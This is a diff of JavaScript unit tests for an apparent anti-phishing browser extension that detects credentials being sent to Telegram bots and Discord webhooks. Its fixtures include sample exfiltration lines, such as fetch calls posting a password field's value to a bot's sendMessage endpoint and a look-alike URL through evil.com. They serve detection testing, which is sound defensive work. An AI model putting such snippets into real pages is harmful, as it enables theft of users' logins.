@@ -66,7 +66,7 @@ function mainWorldClassifier() {
   return {
     fetch(url, body) { win.fetch(url, { body }); },
     classify(url) { seen.length = 0; win.fetch(url, { body: 'x' }); return seen.length ? seen[0].service : null; },
-    seen, raw
+    seen, raw, win, navigator: sandbox.navigator
   };
 }
 
@@ -155,4 +155,76 @@ test('doctrine: credential-exfil warns (never stops), and is quiet on a popular 
   assert.equal(D.surfaceTier(v, { popular: false, host: 'kit.example.xyz' }), 'warn');
   assert.equal(D.surfaceTier(v, { popular: true, host: 'github.com' }), 'quiet');
   assert.equal(D.surfaceTier({ ...v, level: 'suspicious' }, { popular: false, host: 'kit.example.xyz' }), 'warn');
+});
+
+// --- fix round 1: runtime matching reads VALUES of text-bearing params only ---
+const hit = (svc, url, body, secrets) => X.secretInExfilRequest(svc, url, body, secrets);
+const TGU = `https://api.telegram.org/bot7123456789:${TOKEN}/sendMessage`;
+
+test('secretInExfilRequest: a password never matches chat_id, the bot id/token, the method or key names', () => {
+  assert.equal(hit('telegram', TGU, 'chat_id=-1001234567890&text=hello', ['123456']), false);
+  assert.equal(hit('telegram', TGU, 'chat_id=-1001234567890&text=hello', ['1234']), false);
+  assert.equal(hit('telegram', TGU, 'chat_id=-1001234567890&text=hello', ['7123456789']), false, 'bot id is in the path');
+  assert.equal(hit('telegram', TGU, 'chat_id=1&text=hello&parse_mode=HTML', ['HTML']), false);
+  for (const pw of ['text', 'send', 'chat', 'Message', 'sendMessage', 'chat_id', TOKEN.slice(0, 10)]) {
+    assert.equal(hit('telegram', TGU, 'chat_id=-1001234567890&text=hello', [pw]), false, pw);
+  }
+  assert.equal(hit('telegram', TGU, JSON.stringify({ chat_id: 1234567, text: 'hello' }), ['123456']), false);
+  assert.equal(hit('discord', DC, JSON.stringify({ content: 'hi', tts: false }), ['tts', 'false', 'content']), false);
+});
+
+test('secretInExfilRequest: a password inside a text-bearing value matches (urlencoded, JSON, GET query, k=v& serialisation)', () => {
+  assert.equal(hit('telegram', TGU, 'chat_id=-1001234567890&text=Email: a@b.c%0APassword: hunter22', ['hunter22']), true);
+  assert.equal(hit('telegram', TGU, 'chat_id=1&text=Email%3A+a%40b.c%0APassword%3A+hunter22', ['hunter22']), true);
+  assert.equal(hit('telegram', TGU, '{"chat_id":-1001234567890,"text":"pass: hunter22"}', ['hunter22']), true);
+  assert.equal(hit('telegram', TGU + '?chat_id=1&text=pw%20hunter22', '', ['hunter22']), true);
+  assert.equal(hit('telegram', TGU, 'chat_id=-1001234567890&text=email: a@b.c\npassword: hunter22&', ['hunter22']), true);
+  assert.equal(hit('telegram', TGU, 'chat_id=1&caption=hunter22', ['hunter22']), true, 'whole value');
+  assert.equal(hit('discord', DC, '{"content":"login a@b.c / hunter22"}', ['hunter22']), true);
+  assert.equal(hit('discord', DC, '{"embeds":[{"description":"pw hunter22"}]}', ['hunter22']), true);
+  assert.equal(hit('discord', DC, 'payload_json=%7B%22content%22%3A%22hunter22%22%7D', ['hunter22']), true);
+  assert.equal(hit('telegram', TGU, 'plain unparseable body with hunter22 inside', ['hunter22']), true, 'raw fallback');
+  assert.equal(hit('telegram', TGU, 'chat_id=1&text=p%40ss%22w0rd%21', ['p@ss"w0rd!']), true, 'punctuation in the secret');
+});
+
+test('secretInExfilRequest: boundaries and the 4-5 character rule', () => {
+  assert.equal(hit('telegram', TGU, 'text=abc123456def', ['123456']), false, 'inside a longer word/number');
+  assert.equal(hit('telegram', TGU, 'text=code 123456 sent', ['123456']), true);
+  assert.equal(hit('telegram', TGU, 'text=Password: 1234', ['1234']), true, 'whole token');
+  assert.equal(hit('telegram', TGU, 'text=order 12345678 shipped', ['1234']), false, 'part of a number');
+  assert.equal(hit('telegram', TGU, 'text=order #1234 shipped', ['1234']), false, '#1234 is not a whole separated token');
+  assert.equal(hit('telegram', TGU, 'text=abc', ['abc']), false, 'under 4');
+  assert.equal(hit('telegram', TGU, 'text=hunter22', []), false);
+});
+
+test('exfilEndpointInText: not host-anchored look-alikes in script text (M1)', () => {
+  assert.equal(X.exfilEndpointInText(`x('https://xapi.telegram.org/bot123456789:${TOKEN}/sendMessage')`), null);
+  assert.equal(X.exfilEndpointInText(`x('https://evil.com/?u=api.telegram.org/bot123456789:${TOKEN}/sendMessage')`), 'telegram', 'documented: only a host-char prefix is excluded');
+  assert.equal(X.exfilEndpointInText(`x("https://api.telegram.org/bot123456789:${TOKEN}/sendMessage")`), 'telegram');
+});
+
+test('static corroboration: endpoint + an input-value read in the same script', () => {
+  const url = `https://api.telegram.org/bot123456789:${TOKEN}/sendMessage`;
+  assert.equal(X.exfilCredentialScript(`$.ajax({url:"${url}",data:{text:$('#password').val()}})`), 'telegram');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:document.getElementById('pw').value})`), 'telegram');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:new FormData(form)})`), 'telegram');
+  assert.equal(X.exfilCredentialScript(`var passwd=1; fetch("${DC}")`), 'discord');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}",{body:document.title+" "+location.href})`), null, 'notify widget');
+  assert.equal(X.exfilCredentialScript(`$('#password').val()`), null, 'no endpoint');
+  assert.equal(X.exfilCredentialScript(`fetch("${url}"); // bypass the compass`), null, 'pass is word-bounded');
+});
+
+test('isJsScriptType: only classic JS and modules are scanned', () => {
+  for (const t of [null, undefined, '', 'text/javascript', 'module', 'application/javascript', 'TEXT/JavaScript ', 'text/ecmascript']) assert.equal(X.isJsScriptType(t), true, String(t));
+  for (const t of ['application/json', 'application/ld+json', 'text/template', 'text/x-handlebars-template', 'text/html', 'importmap', 'speculationrules']) assert.equal(X.isJsScriptType(t), false, t);
+});
+
+test('MAIN-world guard passes non-bot fetch / XHR / beacon through unchanged', async () => {
+  const m = mainWorldClassifier();
+  assert.equal(await m.win.fetch('https://example.com/api', { body: 'x' }), 'native');
+  assert.equal(m.seen.length, 0);
+  assert.equal(m.navigator.sendBeacon('https://example.com/b', 'x'), true);
+  assert.equal(m.seen.length, 0);
+  assert.equal(m.navigator.sendBeacon(TG, 'x'), true, 'allowed when the isolated world does not cancel');
+  assert.equal(m.seen.length, 1);
 });
